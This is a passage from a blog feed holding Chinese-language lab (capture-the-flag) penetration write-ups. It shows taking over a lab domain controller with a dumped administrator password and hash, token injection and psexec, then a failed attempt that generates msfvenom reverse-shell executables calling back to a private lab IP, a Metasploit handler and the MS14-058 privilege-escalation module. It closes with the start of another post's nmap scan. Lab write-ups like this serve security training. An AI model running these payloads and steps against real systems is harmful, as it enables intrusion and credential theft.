+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接抓到了域管理员 &lt;code>SUN\Administrator&lt;/code> 的明文密码 &lt;code>dc123.com&lt;/code> 和 NTLM 哈希 &lt;code>e8bea972b3549868cecd667a64a6ac46&lt;/code>。这意味着已经完全控制域，可以立刻接管域控。&lt;/p>
+&lt;p>先创建一个监听器&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5ldlchj31kf0r0dk2.jpg"
+loading="lazy"
+alt="image-20260709173013575"
+>&lt;/p>
+&lt;p>注入令牌&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5l8lwaj31w00mfq8w.jpg"
+loading="lazy"
+alt="image-20260709173137639"
+>&lt;/p>
+&lt;p>通过&lt;code>psexec&lt;/code> 派生会话，等待回连&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5l23agj31n605vq5f.jpg"
+loading="lazy"
+alt="image-20260709173232256"
+>&lt;/p>
+&lt;p>成功拿下域控&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1iexy5kxkyhj31v20ny43p.jpg"
+loading="lazy"
+alt="image-20260709173354096"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5krithj30nf0i3ju0.jpg"
+loading="lazy"
+alt="image-20260709173453224"
+>&lt;/p>
+&lt;p>读取flag&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1iexy5kln5nj30tt0553zs.jpg"
+loading="lazy"
+alt="image-20260709173506625"
+>&lt;/p>
+&lt;h2 id="解法二未成功">解法二（未成功）
+&lt;/h2>&lt;p>全程只使用msf&lt;/p>
+&lt;p>建立webshell的过程是相同的，直接进行内网渗透&lt;/p>
+&lt;p>先用msf生成一个木马&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/x64/shell_reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>192.168.111.25 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> -f exe -o exp.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>192.168.111.25 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> -f exe -o exp2.exe &lt;span class="c1">#这个更好用&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5kgcq5j30y905xgoc.jpg"
+loading="lazy"
+alt="image-20260709174458968"
+>&lt;/p>
+&lt;p>上传&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5kcufsj30sv0il0x5.jpg"
+loading="lazy"
+alt="image-20260709174542451"
+>&lt;/p>
+&lt;p>启动msf监听&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> LHOST 0.0.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> LPORT &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1iexy5k8qggj30gu06r0ue.jpg"
+loading="lazy"
+alt="image-20260709180449290"
+>&lt;/p>
+&lt;p>拿到shell后查看权限&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5k4vutj30vv0kuajs.jpg"
+loading="lazy"
+alt="image-20260709174827666"
+>&lt;/p>
+&lt;p>查看主机信息&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5k06x0j310m0as442.jpg"
+loading="lazy"
+alt="image-20260709175409501"
+>&lt;/p>
+&lt;p>使用MS14-058提权，用windows/meterpreter/reverse_tcp有一个坏处是默认是32位的payload，后面进行提权的时候要进行进程迁移，以及指定架构&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sessions -i &lt;span class="m">1&lt;/span> &lt;span class="c1"># 进入会话&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ps 列出进程
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">migrate &amp;lt;64位进程PID&amp;gt; &lt;span class="c1"># 迁移进程&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1iexy5ju44xj314z0uo4d3.jpg"
+loading="lazy"
+alt="image-20260709181657913"
+>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msf exploit&lt;span class="o">(&lt;/span>windows/local/ms14_058_track_popup_menu&lt;span class="o">)&lt;/span> &amp;gt; show targets
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit targets:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">0&lt;/span> Windows x86
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> Windows x64
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf exploit&lt;span class="o">(&lt;/span>windows/local/ms14_058_track_popup_menu&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> target &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">target&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但我这里怎么都无法拿到shell，先到此为止了（&lt;/p></description></item><item><title>红日靶场（三）渗透</title><link>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/</link><pubDate>Sun, 21 Jun 2026 00:00:00 +0000</pubDate><guid>https://Oight.github.io/p/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89%E6%B8%97%E9%80%8F/</guid><description>&lt;h1 id="红日靶场三">红日靶场三
 &lt;/h1>&lt;h2 id="外围打点">外围打点
 &lt;/h2>&lt;p>进靶场首先拿到靶场IP &lt;code>192.168.111.20&lt;/code> 用nmap扫描开放的端口：&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sS 192.168.111.20 -T4
